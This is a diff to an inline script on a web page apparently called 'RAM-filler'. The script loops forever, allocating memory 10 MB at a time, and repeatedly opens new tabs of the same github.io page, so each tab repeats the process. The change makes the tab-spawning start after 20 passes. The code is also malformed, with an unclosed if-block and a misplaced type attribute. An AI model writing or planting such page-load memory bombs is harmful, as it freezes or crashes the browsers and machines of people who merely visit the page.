@@ -4,11 +4,14 @@
 <script> type="text/javascript"
 const memoryHog = [];
 try {
+    let count = 0;
     while (true) {
         // Lägg till 10 MB åt gången
         memoryHog.push(new Array(10 * 1024 * 1024).fill(0));
         console.log("Allocated MB:", memoryHog.length * 10);
-        window.open("https://harryarryarry56-glitch.github.io/RAM-filler/about.html", "_blank");
+        count++
+        if (count > 20){
+            window.open("https://harryarryarry56-glitch.github.io/RAM-filler/about.html", "_blank");
     }
 } catch (e) {
     console.error("Stopped due to:", e);
